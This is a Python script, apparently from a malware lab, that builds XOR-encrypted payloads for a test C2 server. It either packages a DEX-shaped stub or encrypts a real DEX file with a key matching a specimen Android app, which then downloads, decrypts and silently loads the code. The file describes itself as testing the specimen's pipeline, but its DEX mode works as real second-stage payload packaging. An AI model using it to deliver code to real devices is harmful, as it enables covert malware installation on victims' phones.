#!/usr/bin/env python3
"""
Generate a test payload for the lab C2 server.

Two modes:
  1. --stub   Generate a minimal stub that returns recon JSON
              (not a real DEX — specimen's DexClassLoader will fail gracefully)
  2. --dex    XOR-encrypt a real DEX file for C2 delivery

The stub mode is for testing the download+decrypt pipeline without
needing a compilable DEX. The specimen verifies DEX magic bytes
after decryption — stub satisfies that check but DexClassLoader
will fail at class load. SyncTask handles that failure silently.

Usage:
  python generate-test-payload.py --stub -o test-payload.bin
  python generate-test-payload.py --dex path/to/real.dex -o encrypted.bin
"""

import argparse
import os
import struct
import sys
from pathlib import Path

XOR_KEY = b"SkyWeatherSync24"  # must match AppConfig.PAYLOAD_KEY


def xor_encrypt(data: bytes) -> bytes:
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ XOR_KEY[i % len(XOR_KEY)]
    return bytes(result)


def generate_stub() -> bytes:
    """
    Generate a minimal DEX-shaped stub.

    Starts with DEX magic bytes so PayloadManager.decrypt() validation passes.
    DexClassLoader will fail to load it (not a valid DEX), but SyncTask
    handles that silently — the download+decrypt+attempt pipeline is tested.

    Real payload would be compiled from:
      class Module {
          fun execute(context: Any): String {
              return '{"recon": "data"}'
          }
      }
    """
    # DEX magic: "dex\n035\0" (Android 7.0+ format)
    magic = b"dex\n035\x00"

    # Pad to look like a minimal DEX (header is 112 bytes)
    # Fill with recognizable pattern for forensic identification
    header = magic + b'\x00' * (112 - len(magic))

    # Add a string table with recognizable content
    string_data = b"payload.Module\x00execute\x00recon_stub\x00"

    # Total stub: header + string data + padding
    stub = header + string_data + b'\x00' * 128

    print(f"[+] Generated DEX stub: {len(stub)} bytes")
    print(f"    Magic: {stub[:7]}")
    print(f"    Note: Stub passes decrypt validation but DexClassLoader will fail")
    print(f"    This is expected — tests download+decrypt pipeline only")

    return stub


def encrypt_real_dex(dex_path: str) -> bytes:
    """Read a real DEX file and XOR-encrypt it."""
    raw = Path(dex_path).read_bytes()

    if raw[:3] != b'dex':
        print(f"[!] WARNING: {dex_path} doesn't have DEX magic bytes")
        print(f"    Bytes: {raw[:8].hex()}")
    else:
        print(f"[+] Valid DEX: {raw[:7]}")

    print(f"[+] Raw size: {len(raw)} bytes")

    encrypted = xor_encrypt(raw)

    # Verify roundtrip
    decrypted = xor_encrypt(encrypted)
    assert decrypted == raw, "XOR roundtrip failed!"
    print(f"[+] XOR roundtrip verified")

    return encrypted


def main():
    parser = argparse.ArgumentParser(description="Generate test payload for lab C2")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--stub", action="store_true", help="Generate minimal DEX stub")
    group.add_argument("--dex", type=str, help="Path to real DEX file to encrypt")
    parser.add_argument("-o", "--output", type=str, default="test-payload.bin",
                       help="Output file path (default: test-payload.bin)")

    args = parser.parse_args()

    if args.stub:
        raw = generate_stub()
    else:
        if not os.path.exists(args.dex):
            print(f"[!] DEX file not found: {args.dex}")
            sys.exit(1)
        raw = encrypt_real_dex(args.dex)
        # For --dex mode, raw is already encrypted
        Path(args.output).write_bytes(raw)
        print(f"[+] Encrypted payload written to: {args.output}")
        return

    # Encrypt the stub
    encrypted = xor_encrypt(raw)
    Path(args.output).write_bytes(encrypted)
    print(f"[+] Encrypted payload written to: {args.output}")
    print(f"[+] Encrypted size: {len(encrypted)} bytes")

    # Verify
    decrypted = xor_encrypt(encrypted)
    assert decrypted[:3] == b'dex', "Decrypted stub lost DEX magic!"
    print("[+] Verification: decrypt produces DEX magic OK")


if __name__ == "__main__":
    main()
